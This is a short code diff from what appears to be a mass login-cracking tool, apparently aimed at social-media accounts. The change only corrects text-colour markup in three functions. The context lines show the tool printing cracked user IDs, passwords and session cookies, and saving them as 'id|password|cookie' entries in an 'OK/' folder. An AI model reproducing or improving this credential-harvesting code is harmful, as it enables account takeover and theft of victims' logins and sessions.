@@ -982,7 +982,7 @@ def rr071(idf,pwv):
 				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
 				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
 				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
-				print(f"\r{P2} ╰─▶ {bold purple}{ua}")
+				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1016,7 +1016,7 @@ def rr072(idf,pwv):
 				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
 				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
 				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
-				print(f"\r{P2} ╰─▶ {bold purple}{ua}")
+				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
@@ -1083,7 +1083,7 @@ def rr073(idf,pwv):
 				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
 				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
 				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
-				print(f"\r{P2} ╰─▶ {bold purple}{ua}")
+				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
